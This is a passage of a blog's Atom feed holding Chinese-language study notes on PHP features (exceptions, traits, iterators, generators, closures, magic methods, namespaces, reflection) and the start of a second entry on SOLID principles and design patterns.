&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;异常处理&quot;&gt;异常处理&lt;/h1&gt;

&lt;h2 id=&quot;程序中运行时出现的问题-该怎样处理&quot;&gt;程序中运行时出现的问题， 该怎样处理？&lt;/h2&gt;

&lt;h2 id=&quot;什么是异常&quot;&gt;什么是异常？&lt;/h2&gt;

&lt;p&gt;异常处理，是编程语言或计算机硬件里的一种机制，用于处理软件或信息系统中出现的异常状况（即超出程序正常执行流程的某些特殊条件）。&lt;/p&gt;

&lt;h2 id=&quot;怎么样产生一个异常怎样处理产生的异常&quot;&gt;怎么样产生一个异常？怎样处理产生的异常？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;function inverse($x) {
    if (!$x) {
        throw new Exception('Division by zero.');
    }
    else return 1/$x;
}

try {
    echo inverse(5) . &quot;\n&quot;;
    echo inverse(0) . &quot;\n&quot;;
} catch (Exception $e) {
    echo 'Caught exception: ',  $e-&amp;gt;getMessage(), &quot;\n&quot;;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;怎样自定义异常&quot;&gt;怎样自定义异常？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;class MyException extends Exception { }
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;trycatchfinally是怎样协同工作的&quot;&gt;try\catch\finally是怎样协同工作的？&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;http://laruence-wordpress.stor.sinaapp.com/uploads/finally-executionflow.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;php的error-warning-notice等类型的错误怎样通过抛出异常的方式处理&quot;&gt;PHP的error, warning, notice等类型的错误，怎样通过抛出异常的方式处理？&lt;/h2&gt;

&lt;p&gt;trigger_error — 产生一个用户级别的 error/warning/notice 信息&lt;/p&gt;

&lt;h2 id=&quot;怎样捕捉php中的致命错误&quot;&gt;怎样捕捉PHP中的致命错误？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;set_error_handler(&quot;customError&quot;);&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;traits&quot;&gt;Traits&lt;/h1&gt;

&lt;h2 id=&quot;traits是什么&quot;&gt;Traits是什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Traits 是一种为类似 PHP 的单继承语言而准备的代码复用机制。Trait 为了减少单继承语言的限制，使开发人员能够自由地在不同层次结构内独立的类中复用方法集。Traits 和类组合的语义是定义了一种方式来减少复杂性，避免传统多继承和混入类（Mixin）相关的典型问题。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么场景下适合使用trait&quot;&gt;什么场景下适合使用Trait？&lt;/h2&gt;

&lt;p&gt;PHP使用单一继承模型。虽然这种模型足够应付大部分用例场景，但有时用户也需要将一些通用样板代码放置其他无关联的类中。&lt;/p&gt;

&lt;h2 id=&quot;怎样使用trait&quot;&gt;怎样使用Trait？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;trait PropertiesTrait {
    public $same = true;
    public $different = false;
}

class PropertiesExample {
    use PropertiesTrait;
    public $same = true; // Strict Standards
    public $different = true; // 致命错误
}

trait Hello {
    public function sayHello() {
        echo 'Hello ';
    }
}

trait World {
    public function sayWorld() {
        echo 'World!';
    }
}

trait HelloWorld {
    use Hello, World;
}

class MyHelloWorld {
    use HelloWorld;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;预订义接口&quot;&gt;预订义接口&lt;/h1&gt;

&lt;h2 id=&quot;php中有哪些预订义接口它们可实现什么功能&quot;&gt;PHP中有哪些预订义接口？它们可实现什么功能？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;遍历Traversable 检测一个类是否可以使用 foreach 进行遍历的接口。无法被单独实现的基本抽象接口。相反它必须由 IteratorAggregate 或 Iterator 接口实现。&lt;/li&gt;
  &lt;li&gt;迭代器Iterator 可在内部迭代自己的外部迭代器或类的接口。&lt;/li&gt;
  &lt;li&gt;聚合式迭代器IteratorAggregate 创建外部迭代器的接口。&lt;/li&gt;
  &lt;li&gt;数组式访问ArrayAccess 提供像访问数组一样访问对象的能力的接口。&lt;/li&gt;
  &lt;li&gt;序列化 自定义序列化的接口。&lt;/li&gt;
  &lt;li&gt;Closure 用于代表匿名函数的类.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;怎样使用php的预订义接口&quot;&gt;怎样使用PHP的预订义接口？&lt;/h2&gt;

&lt;h2 id=&quot;traversable是什么iterator和iteratoraggregate是什么&quot;&gt;Traversable是什么？Iterator和IteratorAggregate是什么？&lt;/h2&gt;

&lt;p&gt;Traversable 无法被单独实现的基本抽象接口。相反它必须由 IteratorAggregate 或 Iterator 接口实现。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Iterator extends Traversable {
/* 方法 */
abstract public mixed current ( void )
abstract public scalar key ( void )
abstract public void next ( void )
abstract public void rewind ( void )
abstract public boolean valid ( void )
}

IteratorAggregate extends Traversable {
/* 方法 */
abstract public Traversable getIterator ( void )
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;foreach是否只能用于遍历数组&quot;&gt;foreach是否只能用于遍历数组？&lt;/h2&gt;

&lt;h2 id=&quot;怎样高效便捷地读取超大的文本文件&quot;&gt;怎样高效便捷地读取超大的文本文件？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;class FileIterator implements Iterator
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;怎样通过数组的方式调用自定义类中的数据&quot;&gt;怎样通过数组的方式调用自定义类中的数据？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;ArrayAccess（数组式访问）&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;yield是什么东西它和generator类traversable类有什么联系&quot;&gt;yield是什么东西？它和Generator类，Traversable类有什么联系？&lt;/h2&gt;

&lt;p&gt;Generators provide an easy way to implement simple iterators without the overhead or complexity of implementing a class that implements the Iterator interface.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function xrange($start, $limit, $step = 1) {
    for ($i = $start; $i &amp;lt;= $limit; $i += $step) {
        yield $i;
    }
}

echo 'Single digit odd numbers: ';

/* 注意保存在内存中的数组绝不会被创建或返回 */ 
foreach (xrange(1, 9, 2) as $number) {
    echo &quot;$number &quot;;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;什么是回调函数怎样创建回调函数&quot;&gt;什么是回调函数？怎样创建回调函数？&lt;/h2&gt;

&lt;p&gt;call_user_func()和call_user_func_array()&lt;/p&gt;

&lt;h2 id=&quot;怎么样调用匿名函数怎样在匿名函数中使用外部变量&quot;&gt;怎么样调用匿名函数？怎样在匿名函数中使用外部变量？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;匿名函数（Anonymous functions），也叫闭包函数（closures），允许 临时创建一个没有指定名称的函数。最经常用作回调函数（callback）参数的值。当然，也有其它应用的情况。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;$greet = function($name)
{
    printf(&quot;Hello %s\r\n&quot;, $name);
};

$greet('World');
$greet('PHP');

// 继承 $message
$example = function () use ($message) {
    var_dump($message);
};
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;php的魔术方法和魔术常量&quot;&gt;PHP的魔术方法和魔术常量&lt;/h1&gt;

&lt;h2 id=&quot;什么是魔术方法什么是魔术常量&quot;&gt;什么是魔术方法？什么是魔术常量？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone() 和 __debugInfo() 等方法在 PHP 中被称为”魔术方法”（Magic methods）&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;LINE&lt;/strong&gt;  文件中的当前行号。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;FILE&lt;/strong&gt;  文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP 4.0.2 起，&lt;strong&gt;FILE&lt;/strong&gt; 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路径），而在此之前的版本有时会包含一个相对路径。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;DIR&lt;/strong&gt; 文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 dirname(&lt;strong&gt;FILE&lt;/strong&gt;)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0中新增） =&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;FUNCTION&lt;/strong&gt;  函数名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该函数被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CLASS&lt;/strong&gt; 类的名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该类被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。类名包括其被声明的作用区域（例如 Foo\Bar）。注意自 PHP 5.4 起 &lt;strong&gt;CLASS&lt;/strong&gt; 对 trait 也起作用。当用在 trait 方法中时，&lt;strong&gt;CLASS&lt;/strong&gt; 是调用 trait 方法的类的名字。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;TRAIT&lt;/strong&gt; Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4 起此常量返回 trait 被定义时的名字（区分大小写）。Trait 名包括其被声明的作用区域（例如 Foo\Bar）。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;METHOD&lt;/strong&gt;  类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;NAMESPACE&lt;/strong&gt; 当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP 5.3.0 新增）。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;php中有哪些魔术方法&quot;&gt;PHP中有哪些魔术方法？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone() 和 __debugInfo() 等方法在 PHP 中被称为”魔术方法”（Magic methods）&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;调用类中不存在的方法会发生什么&quot;&gt;调用类中不存在的方法会发生什么？&lt;/h2&gt;

&lt;p&gt;在对象中调用一个不可访问方法时，__call() 会被调用。用静态方式中调用一个不可访问方法时，__callStatic() 会被调用。&lt;/p&gt;

&lt;h2 id=&quot;怎样避免一个类被实例化&quot;&gt;怎样避免一个类被实例化？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;private&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;单例模式&lt;/p&gt;

&lt;h2 id=&quot;类中的方法能否以类属性的方式调用&quot;&gt;类中的方法能否以类属性的方式调用？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;命名空间与自动加载&quot;&gt;命名空间与自动加载&lt;/h1&gt;

&lt;h2 id=&quot;什么是命名空间怎样定义命名空间&quot;&gt;什么是命名空间？怎样定义命名空间？&lt;/h2&gt;

&lt;p&gt;在PHP中，命名空间用来解决在编写类库或应用程序时创建可重用的代码如类或函数时碰到的两类问题&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;用户编写的代码与PHP内部的类/函数/常量或第三方类/函数/常量之间的名字冲突。&lt;/li&gt;
  &lt;li&gt;为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;命名空间有什么作用&quot;&gt;命名空间有什么作用？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;命名空间用来解决在编写类库或应用程序时创建可重用的代码如类或函数时碰到的两类问&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;同一个文件内能否定义多个命名空间&quot;&gt;同一个文件内能否定义多个命名空间？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;namespace MyProject;

const CONNECT_OK = 1;
class Connection { /* ... */ }
function connect() { /* ... */  }

namespace AnotherProject;

const CONNECT_OK = 1;
class Connection { /* ... */ }
function connect() { /* ... */  }

namespace MyProject {

const CONNECT_OK = 1;
class Connection { /* ... */ }
function connect() { /* ... */  }
}

namespace AnotherProject {

const CONNECT_OK = 1;
class Connection { /* ... */ }
function connect() { /* ... */  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;什么是非限定名称什么是相对限定名称什么是完全限定名称&quot;&gt;什么是非限定名称？什么是相对限定名称？什么是完全限定名称？&lt;/h2&gt;

&lt;p&gt;PHP 命名空间中的元素使用同样的原理。例如，类名可以通过三种方式引用：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;非限定名称，或不包含前缀的类名称，例如 $a=new foo(); 或 foo::staticmethod();。如果当前命名空间是 currentnamespace，foo 将被解析为 currentnamespace\foo。如果使用 foo 的代码是全局的，不包含在任何命名空间中的代码，则 foo 会被解析为foo。 警告：如果命名空间中的函数或常量未定义，则该非限定的函数名称或常量名称会被解析为全局函数名称或常量名称。详情参见 使用命名空间：后备全局函数名称/常量名称。&lt;/li&gt;
  &lt;li&gt;限定名称,或包含前缀的名称，例如 $a = new subnamespace\foo(); 或 subnamespace\foo::staticmethod();。如果当前的命名空间是 currentnamespace，则 foo 会被解析为 currentnamespace\subnamespace\foo。如果使用 foo 的代码是全局的，不包含在任何命名空间中的代码，foo 会被解析为subnamespace\foo。&lt;/li&gt;
  &lt;li&gt;完全限定名称，或包含了全局前缀操作符的名称，例如， $a = new \currentnamespace\foo(); 或 \currentnamespace\foo::staticmethod();。在这种情况下，foo 总是被解析为代码中的文字名(literal name)currentnamespace\foo。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;定义了命名空间后怎样调用php内置的函数&quot;&gt;定义了命名空间后，怎样调用PHP内置的函数？&lt;/h2&gt;

&lt;h2 id=&quot;怎样在一个命名空间中使用另一个命名空间下的类&quot;&gt;怎样在一个命名空间中使用另一个命名空间下的类？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;use My\Full\Classname as Another;
new \My\Full\Classname();
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;命名空间和文件目录有关系吗&quot;&gt;命名空间和文件目录有关系吗？&lt;/h2&gt;

&lt;p&gt;在文件系统中访问一个文件有三种方式：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;相对文件名形式如foo.txt。它会被解析为 currentdirectory/foo.txt，其中 currentdirectory 表示当前目录。因此如果当前目录是 /home/foo，则该文件名被解析为/home/foo/foo.txt。&lt;/li&gt;
  &lt;li&gt;相对路径名形式如subdirectory/foo.txt。它会被解析为 currentdirectory/subdirectory/foo.txt。&lt;/li&gt;
  &lt;li&gt;绝对路径名形式如/main/foo.txt。它会被解析为/main/foo.txt。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;怎样实现类的自动加载&quot;&gt;怎样实现类的自动加载？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;反射&quot;&gt;反射&lt;/h1&gt;

&lt;h2 id=&quot;什么是反射&quot;&gt;什么是反射？&lt;/h2&gt;

&lt;p&gt;在计算机科学中，反射是指计算机程序在运行时（Run time）可以访问、检测和修改它本身状态或行为的一种能力。&lt;/p&gt;

&lt;h2 id=&quot;通过反射可以了解哪些信息&quot;&gt;通过反射可以了解哪些信息？&lt;/h2&gt;

&lt;p&gt;某个类中所有的方法、属性、注释、方法参数等&lt;/p&gt;

&lt;h2 id=&quot;什么时候使用类函数什么时候使用反射&quot;&gt;什么时候使用类函数？什么时候使用反射？&lt;/h2&gt;

&lt;p&gt;反射使用场景： 自动加载插件，自动生成文档，甚至可用来扩充PHP语言。&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;http://thisisbaozi.github.io/blog/2014/02/12/phpzai-webkai-fa-zhong-staticde-shi-yong-chang-jing/&quot;&gt;PHP在Web开发中static的使用场景&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.php-internals.com/book/?p=chapt05/05-05-class-magic-methods-latebinding&quot;&gt;魔术方法，延迟绑定及静态成员&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://php.net/manual/zh/language.oop5.late-static-bindings.php&quot;&gt;后期静态绑定&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.laruence.com/2012/08/16/2709.html&quot;&gt;PHP的新特性finally&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.infoq.com/cn/news/2012/03/PHP-5.4&quot;&gt;PHP 5.4弃Register Globals增Traits&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.laruence.com/2011/07/02/2097.html&quot;&gt;PHP5.4的新特性&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.tuicool.com/articles/eaMzuu7&quot;&gt;PHP如何快速读取大文件&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.laruence.com/2010/06/20/1602.html&quot;&gt;深入理解PHP之匿名函数&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.php-internals.com/book/?p=chapt04/04-04-anonymous-function&quot;&gt;匿名函数及闭包&lt;/a&gt;\&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>PHP设计模式</title>
   <link href="http://yanpeipan.github.io/2015/01/11/php%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html"/>
   <updated>2015-01-11T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2015/01/11/php设计模式</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;走进设计模式&quot;&gt;走进设计模式&lt;/h1&gt;

&lt;h2 id=&quot;什么是模式&quot;&gt;什么是模式？&lt;/h2&gt;

&lt;p&gt;设计模式这个术语是由Erich Gamma等人在1990年代从建筑设计领域引入到计算机科学的。它是对软件设计中普遍存在（反复出现）的各种问题，所提出的解决方案。&lt;/p&gt;

&lt;h2 id=&quot;什么是php设计模式&quot;&gt;什么是PHP设计模式？&lt;/h2&gt;

&lt;h2 id=&quot;什么是umluml怎样表示类和类的相互关系&quot;&gt;什么是UML？UML怎样表示类和类的相互关系？&lt;/h2&gt;

&lt;p&gt;统一建模语言（UML，英语：Unified Modeling Language）是非专利的第三代建模和规约语言。UML是一种开放的方法，用于说明、可视化、构建和编写一个正在开发的、面向对象的、软件密集系统的制品的开放方法。UML展现了一系列最佳工程实践，这些最佳实践在对大规模，复杂系统进行建模方面，特别是在软件架构层次已经被验证有效。&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;设计原则&quot;&gt;设计原则&lt;/h1&gt;

&lt;h2 id=&quot;设计模式通常遵循的原则有哪些&quot;&gt;设计模式通常遵循的原则有哪些？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;单一职责原则（Single Responsibility Principle）&lt;br /&gt;
不要存在多于一个导致类变更的原因。通俗的说，即一个类只负责一项职责。&lt;/li&gt;
  &lt;li&gt;里氏替换原则（Liskov Substitution Principle）&lt;br /&gt;
所有引用基类的地方必须能透明地使用其子类的对象。&lt;/li&gt;
  &lt;li&gt;依赖倒置原则（Dependence Inversion Principle）&lt;br /&gt;
高层模块不应该依赖低层模块，二者都应该依赖其抽象；抽象不应该依赖细节；细节应该依赖抽象。&lt;/li&gt;
  &lt;li&gt;接口隔离原则（Interface Segregation Principle）&lt;br /&gt;
客户端不应该依赖它不需要的接口；一个类对另一个类的依赖应该建立在最小的接口上。&lt;/li&gt;
  &lt;li&gt;迪米特法则（Law Of Demeter）&lt;br /&gt;
一个对象应该对其他对象保持最少的了解。迪米特法则又叫最少知道原则，最早是在1987年由美国Northeastern University的Ian Holland提出。&lt;/li&gt;
  &lt;li&gt;开放-关闭原则&lt;br /&gt;
一个软件实体如类、模块和函数应该对扩展开放，对修改关闭。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;为什么说组合优于继承&quot;&gt;为什么说组合优于继承？&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;组 合 关 系&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;继 承 关 系&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;优点：不破坏封装，整体类与局部类之间松耦合，彼此相对独立&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;缺点：破坏封装，子类与父类之间紧密耦合，子类依赖于父类的实现，子类缺乏独立性&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;优点：具有较好的可扩展性&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;缺点：支持扩展，但是往往以增加系统结构的复杂度为代价&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;优点：支持动态组合。在运行时，整体对象可以选择不同类型的局部对象&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;缺点：不支持动态继承。在运行时，子类无法选择不同的父类&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;优点：整体类可以对局部类进行包装，封装局部类的接口，提供新的接口&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;缺点：子类不能改变父类的接口&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;缺点：整体类不能自动获得和局部类同样的接口&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;优点：子类能自动继承父类的接口&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;缺点：创建整体类的对象时，需要创建所有局部类的对象&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;优点：创建子类的对象时&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;blockquote&gt;
  &lt;p&gt;具体情况具体分析，避免过度设计。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么叫解耦怎样实现解耦&quot;&gt;什么叫解耦？怎样实现解耦？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;对于软件架构设计中模块间的解耦或者说松耦合，则需要包括两个层面的含义，拿A,B两个模块来举例。第一个层面的解耦是指A不用了解到B模块内部的细节，B模块内部细节的变化不会影响到A模块对B模块能力和服务的消费；第二个层面则是A模块的完整运行不受到B模块任何状态变化的影响，即使是B模块完全失效也不至于影响到A模块本身的业务。对于第一个层面重点是模块本身的高内聚，松耦合划分，服务层的设计，通过服务层来完成模块间的解耦；对于第二个层面则重点是消息中间件，异步和事件驱动机制。所以在进行组件化架构和解耦的设计时候一定要关注到我们真正关注的目标。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;如何理解针对接口编程而不是针对实现编程&quot;&gt;如何理解针对接口编程而不是针对实现编程？&lt;/h2&gt;

&lt;p&gt;接口从更深层次的理解，应是定义（规范，约束）与实现（名实分离的原则）的分离。
接口的本身反映了系统设计人员对系统的抽象理解。
接口应有两类：&lt;br /&gt;
第一类是对一个体的抽象，它可对应为一个抽象体(abstract class)；&lt;br /&gt;
第二类是对一个体某一方面的抽象，即形成一个抽象面（interface）；&lt;/p&gt;

&lt;h2 id=&quot;什么叫单一职责&quot;&gt;什么叫单一职责？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;所谓职责是指类变化的原因。如果一个类有多于一个的动机被改变，那么这个类就具有多于一个的职责。而单一职责原则就是指一个类或者模块应该有且只有一个改变的原因。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么叫开放-封闭原则&quot;&gt;什么叫开放-封闭原则？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;对扩展开放，意味着有新的需求或变化时，可以对现有代码进行扩展，以适应新的情况。对修改封闭，意味着类一旦设计完成，就可以独立完成其工作，而不要对类进行任何修改。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么叫依赖倒置原则&quot;&gt;什么叫依赖倒置原则？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;所谓依赖倒置原则（Dependence Inversion Principle）就是要依赖于抽象，不要依赖于具体。简单的说就是要求对抽象进行编程，不要对实现进行编程，这样就降低了客户与实现模块间的耦合。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;面向对象编程还应该遵循哪些原则&quot;&gt;面向对象编程还应该遵循哪些原则？&lt;/h2&gt;

&lt;p&gt;面向对象的S.O.L.I.D 原则&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Single Responsibility Principle (SRP) – 职责单一原则&lt;/li&gt;
  &lt;li&gt;Open/Closed Principle (OCP) – 开闭原则&lt;/li&gt;
  &lt;li&gt;Liskov substitution principle (LSP) – 里氏代换原则&lt;/li&gt;
  &lt;li&gt;Interface Segregation Principle (ISP) – 接口隔离原则&lt;/li&gt;
  &lt;li&gt;Dependency Inversion Principle (DIP) – 依赖倒置原则&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;常见设计模式&quot;&gt;常见设计模式&lt;/h1&gt;

&lt;h2 id=&quot;什么是单例模式&quot;&gt;什么是单例模式？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;单例模式，也叫单子模式，是一种常用的软件设计模式。在应用这个模式时，单例对象的类必须保证只有一个实例存在。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;通常单例模式在Java语言中，有两种构建方式：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;懒汉方式。指全局的单例实例在第一次被使用时构建。&lt;/li&gt;
  &lt;li&gt;饿汉方式。指全局的单例实例在类装载时构建。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;单例模式适用于什么场景&quot;&gt;单例模式适用于什么场景？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;当类只能有一个实例而且客户可以从一个众所周知的访问点访问它时&lt;/li&gt;
  &lt;li&gt;当这个唯一实例应该是通过子类化可扩展的。并且用户应该无需更改代码就能使用一个扩展的实例时。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;什么是工厂模式php怎么样实现工厂模式&quot;&gt;什么是工厂模式？PHP怎么样实现工厂模式？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;工厂模式 是一种类，它具有为您创建对象的某些方法。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是原型模式原型模式的核心概念是什么&quot;&gt;什么是原型模式？原型模式的核心概念是什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;原型模式是创建型模式的一种,其特点在于通过“复制”一个已经存在的实例来返回新的实例,而不是新建实例。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是外观模式php怎样实现外观模式&quot;&gt;什么是外观模式？PHP怎样实现外观模式？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;外观模式（Facade pattern），是软件工程中常用的一种软件设计模式，它为子系统中的一组接口提供一个统一的高层接口，使得子系统更容易使用。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;外观模式适用于何种场景&quot;&gt;外观模式适用于何种场景？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;当要为访问一系列复杂的子系统提供一个简单入口时可以使用外观模式。&lt;/li&gt;
  &lt;li&gt;客户端程序与多个子系统之间存在很大的依赖性。引入外观类可以将子系统与客户端解耦，从而提高子系统的独立性和可移植性。&lt;/li&gt;
  &lt;li&gt;在层次化结构中，可以使用外观模式定义系统中每一层的入口，层与层之间不直接产生联系，而通过外观类建立联系，降低层之间的耦合度。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;什么是组合模式日常生活中有哪些类似组合模式的例子&quot;&gt;什么是组合模式？日常生活中有哪些类似组合模式的例子？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;(GoF《设计模式》)：将对象组合成树形结构以表示“部分整体”的层次结构。组合模式使得用户对单个对象和组合对象的使用具有一致性。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;组合模式的核心概念是什么&quot;&gt;组合模式的核心概念是什么？&lt;/h2&gt;

&lt;h2 id=&quot;装饰模式有什么优点&quot;&gt;装饰模式有什么优点？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;修饰模式，是面向对象编程领域中，一种动态地往一个类中添加新的行为的设计模式。就功能而言，修饰模式相比生成子类更为灵活，这样可以给某个对象而不是整个类添加一些功能。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;php怎样实现装饰模式&quot;&gt;PHP怎样实现装饰模式？&lt;/h2&gt;

&lt;p&gt;##适配器模式中的适配器是什么意思？&lt;/p&gt;

&lt;blockquote&gt;
